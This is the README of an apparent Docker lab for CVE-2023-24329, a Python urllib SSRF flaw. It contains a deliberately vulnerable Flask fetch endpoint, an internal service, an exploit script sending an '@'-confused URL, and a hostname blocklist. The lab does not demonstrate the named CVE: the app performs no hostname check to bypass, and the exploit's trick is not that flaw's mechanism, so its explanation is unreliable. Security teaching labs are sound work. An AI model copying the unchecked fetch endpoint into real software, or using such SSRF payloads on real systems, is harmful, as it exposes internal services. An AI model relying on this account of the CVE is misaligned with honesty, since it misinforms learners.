# urllib_ssrf_lab

A demonstration of [CVE-2023-24329](https://nvd.nist.gov/vuln/detail/CVE-2023-24329) – a URL parsing vulnerability in Python’s `urllib` that can be abused to bypass hostname checks and perform SSRF (Server-Side Request Forgery).

## 🗂 Directory structure
```
urllib_ssrf_lab/
├── docker-compose.yml
├── vulnerable_app/
│   ├── Dockerfile
│   └── app.py
├── internal_api/
│   ├── Dockerfile
│   └── app.py
├── exploit.py
├── remediate.py
└── README.md
```

---

### vulnerable_app/Dockerfile
```Dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY app.py .
RUN pip install flask
EXPOSE 5000
CMD ["python", "app.py"]
```

### vulnerable_app/app.py
```python
from flask import Flask, request
import urllib.request

app = Flask(__name__)

@app.route("/fetch")
def fetch():
    url = request.args.get("url")
    if not url:
        return "Missing URL parameter", 400

    try:
        with urllib.request.urlopen(url) as response:
            return response.read(), 200
    except Exception as e:
        return f"Request failed: {e}", 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

### internal_api/Dockerfile
```Dockerfile
FROM python:3.9-slim
WORKDIR /app
COPY app.py .
RUN pip install flask
EXPOSE 8000
CMD ["python", "app.py"]
```

### internal_api/app.py
```python
from flask import Flask

app = Flask(__name__)

@app.route("/")
def index():
    return "Internal API: You shouldn’t be here via SSRF!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

---

### docker-compose.yml
```yaml
version: '3'
services:
  vulnerable-app:
    build: ./vulnerable_app
    ports:
      - "5000:5000"
    networks:
      - ssrf-net

  internal-api:
    build: ./internal_api
    expose:
      - "8000"
    networks:
      - ssrf-net

networks:
  ssrf-net:
    driver: bridge
```

---

### exploit.py
```python
import requests

# This sends a deceptive URL
ssrf_url = "http://localhost:5000/fetch?url=http://127.0.0.1@internal-api:8000"

print("Sending SSRF attempt to vulnerable app...")
response = requests.get(ssrf_url)
print("Response:")
print(response.text)
```

---

### remediate.py
```python
import urllib.parse

def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    hostname = parsed.hostname
    return hostname not in ("127.0.0.1", "localhost", "0.0.0.0", "internal-api")

url = input("Enter a URL: ")
if is_safe_url(url):
    print("Safe URL, proceeding with fetch...")
else:
    print("Blocked potentially unsafe URL.")
```

---

## 🛠 Setup

### Pushing to an existing GitHub repo
If you already have an empty GitHub repository named `urllib_ssrf_lab`, run:
```bash
git init
git remote add origin https://github.com/<your-username>/urllib_ssrf_lab.git
git add .
git commit -m "Initial commit: CVE-2023-24329 SSRF lab"
git branch -M main
git push -u origin main
```

### Cloning and running the lab
```bash
git clone https://github.com/<your-username>/urllib_ssrf_lab.git
cd urllib_ssrf_lab
docker-compose up --build
```

## 🚨 Exploitation
```bash
python exploit.py
```

## 🛡 Remediation
```bash
python remediate.py
```

## ✅ Fix
- Use Python >= 3.11.4
- Sanitize input URLs before making outbound requests
- Implement allowlists or DNS/IP validation
